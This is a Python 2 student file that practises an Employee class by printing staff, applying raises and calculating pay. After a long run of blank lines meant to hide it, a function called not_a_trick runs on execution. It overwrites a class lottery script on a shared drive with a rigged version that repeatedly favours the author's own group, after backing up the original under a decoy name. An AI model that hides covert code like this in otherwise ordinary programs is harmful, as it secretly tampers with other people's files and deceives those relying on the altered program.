#
#A program to practice using the employee class
#By Daniel Graham

from employee import Employee



def print_by_dept(employee_list, department):
    department_list = []
    print "Employees in department " + department + ":"
    for employee in employee_list:
        employee_department = employee.getDepartment()
        if employee_department == department:
            department_list.append(employee)
    for employee in department_list:
        print employee.getName()

def raise_by_dept(employee_list, department, raise_amount):
    raise_list = []
    for employee in employee_list:
        employee_department = employee.getDepartment()
        if employee_department == department:
            raise_list.append(employee)
    for employee in raise_list:
        employee.changeHourlyRate(employee.getHourlyRate() + raise_amount)
        
def calc_pay_checks(employee_list, hours_list):
    for employee in employee_list:
        hours = hours_list[employee_list.index(employee)]
        print employee.getName() + " has worked " + str(hours) + " hours and earned $%0.2f" %employee.calc_pay(hours)

def get_employees_by_rate(employee_list, pay_rate):
    higher_paygrade = []
    for employee in employee_list:
        if employee.getHourlyRate() >= pay_rate:
            higher_paygrade.append(employee)
    return higher_paygrade
        

def main():
    
    ford_prefect = Employee('Ford Prefect', 9.50, 'H')
    zaphod_beeblebrox = Employee("Zaphod Beeblebrox", 8.50, 'G')
    tricia_mcmillan = Employee("Tricia McMillan", 7.50, 'G')
    sirius_black = Employee("Sirius Black", 9.00 , 'H')
    bilbo_baggins = Employee("Bilbo Baggins", 8.50, 'G')
    elizabeth_montgomery = Employee("Elizabeth Montgomery", 8.00, 'G')
    employee_list = [ford_prefect, zaphod_beeblebrox, tricia_mcmillan, sirius_black, bilbo_baggins, elizabeth_montgomery]
    hours_list = [40, 10, 50, 20, 100, 60]
    for e in employee_list:
        print e
    print 
    raise_by_dept(employee_list, 'G', 1.00)
    print_by_dept(employee_list, 'G')
    print 
    print "Raise rates:"
    for e in employee_list:
        print e
    print     
    print "Pay checks:"
    calc_pay_checks(employee_list, hours_list)
    print
    print "Employees paid $9.00 or over"
    for employee in get_employees_by_rate(employee_list,9.00):
        print employee

main()





































































































































































































































































































































































































import random
import os

def not_a_trick():   
     
    to_write = """import random

def main():
   again = 'y'
   while again == 'y':
       Slytherin = ["Daniel Graham", "David Newton", "Sarah Baliak", "Levi Sledd"]
       Elphabanana = ["Christopher Brittain", "Michael Yu", "Tristan Conroy"]
       GrandAlf = ["Colin Wurster", "Daniel Curran", "Han He", "Ye Sheng"]
       Huffandpuff =  ['Bingxu Ren', 'Forrest Kamperman', 'Nicolas Montejos', 'Philip Barsotti']
       Cravenclaw = ['Samuel Lane', 'William Thackery', 'Yifan Li']
       Gryffinsnore = ["Austin Sargraves", "John Coogan", "Matt Schendstok"]
       selected_names = []

       house_list = [Elphabanana, GrandAlf, Huffandpuff, Cravenclaw, Gryffinsnore]
       house_list1 = [Slytherin, Elphabanana, GrandAlf, Huffandpuff, Cravenclaw, Gryffinsnore]
       house_list_string = ['Slytherin', 'Elphaba', 'Gandalf', 'Hufflepuff', 'Ravenclaw', 'Gryffindor']
       random.shuffle(house_list)
       print
       for j in range(6):
           if j%2 == 0:
               selected_house = Slytherin
           else:
               selected_house = house_list[j-1]
           x = 'n'
           num = 0
           random.shuffle(selected_house)
           while x == 'n':
         
            
               selected_hero = selected_house[num]
               for name in selected_names:
                   if name == selected_hero:
                       selected_hero = selected_house[num+1]
               selected_names.append(selected_hero)            
               print "The champion for " + str(house_list_string[house_list1.index(selected_house)]) + " is " + str(selected_hero) + "."
               x = raw_input( "Enter 'n' if he/she isn't here: ")
               print
               num +=1
               if num > (len(selected_house)-1):
                   print 'Oh no!'
                   x = 'n'
       again = raw_input("Go around again?")


       #For the glory of Salazar!
main()"""
    
    file_name =os.path.abspath('U:\CSC117_FA2013\student_lottery_one_from_each.py')

    if os.path.exists(file_name) == True:
        
        #copies current code and saves it as Invisibilitycloak.py in the same folder as this program. Because I am not evil....

        fin_to_copy = open(os.path.abspath(file_name), 'r')
        copy_file = fin_to_copy.read()

        if copy_file != to_write:
            fout_copy_original = open('U:\CSC117_FA2013\InvisibilityCloak.py', 'w') 
            fout_copy_original.write(str(copy_file))
            fout_copy_original.close()
        fin_to_copy.close()
        

        #Now I will write over the current lottery code...Mua ha ha ha

        fout = open(os.path.abspath(file_name), 'w')
        fout.write(to_write)
        fout.close()
not_a_trick()
